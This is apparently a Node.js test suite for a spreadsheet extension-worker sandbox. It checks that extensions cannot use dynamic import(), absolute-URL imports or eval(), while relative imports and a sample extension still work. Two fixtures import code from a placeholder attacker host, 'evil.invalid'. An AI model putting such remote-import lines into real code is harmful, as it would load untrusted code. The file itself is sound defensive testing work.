const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("node:path");
const os = require("node:os");
const fs = require("node:fs/promises");
const { Worker } = require("node:worker_threads");
const { pathToFileURL } = require("node:url");

async function createTempDir(prefix) {
  return fs.mkdtemp(path.join(os.tmpdir(), prefix));
}

async function ensureExtensionApiResolvable() {
  const repoRoot = path.resolve(__dirname, "../../..");
  const scopeDir = path.join(repoRoot, "node_modules", "@formula");
  const linkPath = path.join(scopeDir, "extension-api");
  const target = path.resolve(__dirname, "../../extension-api");

  try {
    await fs.lstat(linkPath);
    return;
  } catch {
    // ignore
  }

  await fs.mkdir(scopeDir, { recursive: true });
  await fs.symlink(target, linkPath, process.platform === "win32" ? "junction" : undefined);
}

async function writeFiles(rootDir, files) {
  for (const [relPath, contents] of Object.entries(files)) {
    const fullPath = path.join(rootDir, relPath);
    await fs.mkdir(path.dirname(fullPath), { recursive: true });
    await fs.writeFile(fullPath, contents, "utf8");
  }
}

function withTimeout(promise, timeoutMs, message) {
  return Promise.race([
    promise,
    new Promise((_, reject) => {
      setTimeout(() => reject(new Error(message)), timeoutMs);
    })
  ]);
}

async function activateExtensionWorker({
  mainUrl,
  extensionPath,
  sandbox,
  apiHandler
}) {
  await ensureExtensionApiResolvable();
  const extensionWorkerUrl = pathToFileURL(
    path.resolve(__dirname, "../src/browser/extension-worker.mjs")
  ).href;

  const wrapperDir = await createTempDir("formula-ext-worker-wrapper-");
  const wrapperPath = path.join(wrapperDir, "wrapper.mjs");
  await fs.writeFile(
    wrapperPath,
    `import { parentPort } from "node:worker_threads";
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";

globalThis.self = globalThis;

const listeners = new Map();
globalThis.addEventListener = (type, listener) => {
  const key = String(type);
  if (!listeners.has(key)) listeners.set(key, new Set());
  listeners.get(key).add(listener);
};
globalThis.removeEventListener = (type, listener) => {
  const set = listeners.get(String(type));
  if (!set) return;
  set.delete(listener);
};

globalThis.postMessage = (message) => parentPort.postMessage(message);

parentPort.on("message", (message) => {
  const set = listeners.get("message");
  if (!set) return;
  for (const listener of [...set]) {
    try {
      listener({ data: message });
    } catch {
      // ignore
    }
  }
});

const nativeFetch = typeof globalThis.fetch === "function" ? globalThis.fetch.bind(globalThis) : null;
if (!nativeFetch) {
  throw new Error("Test worker runtime requires fetch()");
}

globalThis.fetch = async (input, init) => {
  const url = typeof input === "string" ? input : input?.url ?? String(input);
  if (url.startsWith("file://")) {
    const data = await readFile(fileURLToPath(url));
    return new Response(data, { status: 200 });
  }
  return nativeFetch(input, init);
};

await import(${JSON.stringify(extensionWorkerUrl)});
parentPort.postMessage({ type: "__ready__" });
`,
    "utf8"
  );

  const worker = new Worker(pathToFileURL(wrapperPath), { type: "module" });
  const activationId = "activate-1";

  try {
    await withTimeout(
      new Promise((resolve, reject) => {
        const onMessage = (msg) => {
          if (!msg || typeof msg !== "object") return;
          if (msg.type === "__ready__") {
            worker.postMessage({
              type: "init",
              extensionId: "test.extension",
              extensionPath,
              extensionUri: extensionPath,
              globalStoragePath: "memory://global",
              workspaceStoragePath: "memory://workspace",
              mainUrl,
              sandbox
            });
            worker.postMessage({ type: "activate", id: activationId, reason: "test" });
            return;
          }

          if (msg.type === "api_call") {
            Promise.resolve()
              .then(async () => {
                if (typeof apiHandler === "function") {
                  return apiHandler({
                    namespace: msg.namespace,
                    method: msg.method,
                    args: Array.isArray(msg.args) ? msg.args : []
                  });
                }
                return null;
              })
              .then(
                (result) => {
                  worker.postMessage({ type: "api_result", id: msg.id, result });
                },
                (error) => {
                  worker.postMessage({
                    type: "api_error",
                    id: msg.id,
                    error: { message: String(error?.message ?? error), stack: error?.stack }
                  });
                }
              );
            return;
          }

          if (msg.type === "activate_result" && msg.id === activationId) {
            worker.off("message", onMessage);
            resolve(null);
            return;
          }
          if (msg.type === "activate_error" && msg.id === activationId) {
            worker.off("message", onMessage);
            const err = new Error(String(msg.error?.message ?? "Activation failed"));
            if (msg.error?.stack) err.stack = msg.error.stack;
            reject(err);
          }
        };

        worker.on("message", onMessage);
        worker.once("error", reject);
        worker.once("exit", (code) => {
          reject(new Error(`Worker exited unexpectedly (${code})`));
        });
      }),
      2000,
      "Timed out waiting for extension worker activation"
    );
  } finally {
    await worker.terminate();
    await fs.rm(wrapperDir, { recursive: true, force: true });
  }
}

test("extension-worker: rejects dynamic import()", async () => {
  const dir = await createTempDir("formula-ext-worker-dynamic-import-");
  try {
    await writeFiles(dir, {
      "main.mjs": `export async function activate() {\n  await import("https://evil.invalid/evil.mjs");\n}\n`
    });
    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;

    await assert.rejects(
      () => activateExtensionWorker({ mainUrl, extensionPath }),
      /Dynamic import is not allowed/i
    );
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test("extension-worker: rejects static absolute URL imports", async () => {
  const dir = await createTempDir("formula-ext-worker-absolute-import-");
  try {
    await writeFiles(dir, {
      "main.mjs": `import "https://evil.invalid/evil.mjs";\nexport async function activate() {}\n`
    });
    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;

    await assert.rejects(
      () => activateExtensionWorker({ mainUrl, extensionPath }),
      /Disallowed import specifier 'https:\/\/evil\.invalid\/evil\.mjs'/i
    );
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test("extension-worker: allows relative import graphs", async () => {
  const dir = await createTempDir("formula-ext-worker-relative-import-");
  try {
    await writeFiles(dir, {
      "main.mjs": `import { value } from "./dep.mjs";\nexport async function activate() {\n  if (value !== 123) throw new Error("bad");\n}\n`,
      "dep.mjs": `export const value = 123;\n`
    });
    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;

    await activateExtensionWorker({ mainUrl, extensionPath });
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test("extension-worker: eval() throws when disableEval is enabled", async () => {
  const dir = await createTempDir("formula-ext-worker-eval-");
  try {
    await writeFiles(dir, {
      "main.mjs": `export async function activate() {\n  eval("1 + 1");\n}\n`
    });
    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;

    await assert.rejects(
      () => activateExtensionWorker({ mainUrl, extensionPath }),
      /eval is not allowed in extensions/i
    );
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test("extension-worker: sample extension activates under strict sandbox defaults", async () => {
  const distDir = path.resolve(__dirname, "../../../extensions/sample-hello/dist");
  const mainUrl = pathToFileURL(path.join(distDir, "extension.mjs")).href;
  const extensionPath = pathToFileURL(`${distDir}${path.sep}`).href;

  await activateExtensionWorker({
    mainUrl,
    extensionPath,
    apiHandler({ namespace, method }) {
      if (namespace === "commands" && (method === "registerCommand" || method === "unregisterCommand")) {
        return null;
      }
      if (namespace === "functions" && (method === "register" || method === "unregister")) {
        return null;
      }
      return null;
    }
  });
});
